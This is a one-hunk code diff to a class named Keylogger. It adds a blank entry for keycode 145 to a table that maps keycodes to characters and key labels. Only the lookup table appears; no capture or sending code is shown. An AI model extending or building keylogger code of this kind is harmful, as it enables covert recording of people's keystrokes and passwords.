@@ -250,6 +250,7 @@ class Keylogger
         map[98] = ["0","\\INSERT"]
         map[99] = [".","\\DELETE"]
         map[100] = ["",""] //
+        map[145] = ["",""] //
         /////
         map[224] = ["\\LC","\\LC"] // left control
         map[225] = ["\\LS","\\LS"] // left shift
